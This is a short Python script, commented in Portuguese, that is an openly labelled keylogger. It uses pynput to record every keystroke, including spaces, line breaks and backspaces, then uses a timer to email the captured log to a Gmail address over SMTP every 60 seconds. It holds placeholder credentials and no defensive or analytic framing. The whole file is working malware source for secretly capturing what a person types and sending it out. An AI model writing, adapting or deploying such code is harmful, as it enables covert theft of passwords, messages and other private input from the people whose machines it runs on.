from asyncio import start_server

from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""
#configurações de email
EMAIL_ORIGEM = "seu_email_teste@gmail.com"
EMAIL_DESTINO = "seu_email_teste@gmail.com"
SENHA_EMAIL = "sua senha gerada"

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados capturados pelo keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar", e)

        log = ""

    #agendar o envio a cada 60 segundos
    Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        log+= key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log+=" "
        if key == keyboard.Key.enter:
            log += "\n"
        if key == keyboard.Key.backspace:
            log+="[<]"
        else:
            pass #ignora ctrl, shift, etc

#inicia o keylogger

with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()